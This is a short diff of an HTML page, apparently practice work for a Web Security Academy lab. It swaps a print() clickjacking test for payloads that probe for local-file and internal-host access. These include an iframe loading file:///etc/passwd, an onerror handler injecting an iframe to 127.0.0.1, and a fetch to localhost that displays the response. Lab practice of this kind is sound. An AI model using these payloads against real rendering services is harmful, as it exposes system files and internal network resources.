@@ -7,6 +7,8 @@
     <title>Document</title>
 </head>
 <body>
- <script>print()</script>
-    <iframe src="https://0aea0043039b41f6c25b5c0900320026.web-security-academy.net/" ></iframe></body>
+    <iframe src="file:///etc/passwd" width="400" height="400">
+        <img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
+
+        <script>fetch('localhost').then(r=>r.text()).then(s=>alert(s))</script>
 </html>
